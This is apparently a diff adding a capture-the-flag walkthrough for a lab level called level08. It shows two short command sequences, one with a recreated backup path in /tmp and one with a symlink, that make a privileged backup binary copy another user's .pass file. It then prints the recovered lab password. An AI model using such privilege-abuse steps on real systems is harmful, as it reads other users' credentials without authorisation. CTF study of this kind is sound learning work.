@@ -1,0 +1,23 @@
+HOW TO FIND THE FLAG:
+
+After analysing the binary file and reverse engineered it we can see that the program is going to open the file given as a parameter and will backup in a backup directory.
+
+As we don't have the permission on the backup directory in the home/users/level09/ path we are going to go in /tmp directory 
+
+Then we create the same path in tmp backups/home/users/level09 and execute our binary file with parameter /home/users/level09/.pass
+
+1. cd /tmp
+2. mkdir -p backups/home/users/level09/
+3. ~/level08 /home/users/level09/.pass
+4. cat backups/home/users/level09/.pass
+
+Another solution is to create a symbolic link
+
+1. chmod +w .
+2. ln -s /home/users/level09/.pass sympass
+3 ./level08 sympass
+4. cat backups/sympass
+
+The flag is fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+su level09 -> fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
